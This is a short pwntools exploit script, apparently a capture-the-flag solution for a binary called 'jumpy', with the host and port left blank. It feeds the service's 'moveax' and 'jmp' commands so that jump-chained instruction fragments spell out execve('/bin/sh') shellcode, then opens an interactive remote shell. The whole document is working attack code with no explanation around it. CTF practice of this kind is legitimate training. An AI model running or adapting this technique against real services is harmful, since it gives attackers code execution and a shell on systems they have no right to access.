from pwn import *

HOST = ''
PORT = ''

# p = process('./jumpy')
p = remote(HOST, PORT, ssl = True)

def mov_eax(op):
	p.sendlineafter(b'> ', b'moveax')
	p.sendline(str(op))

def jmp(op):
	mov_eax(0x05eb)
	p.sendlineafter(b'> ', b'jmp')
	p.sendline(b'-6')
	mov_eax(op)

def jmp2(eax, op):
	mov_eax(0x0aeb)
	mov_eax(str(eax))
	p.sendlineafter(b'> ', b'jmp')
	p.sendline(b'-11')
	mov_eax(op)


jmp2(0x6e69622f, 0x90900689)
jmp2(0x68732f, 0x90044689)

jmp(0x90f78748)
jmp(0x9090f631)

jmp2(0x3b, 0x050f)

p.recv()
p.sendline(b'a')

p.interactive()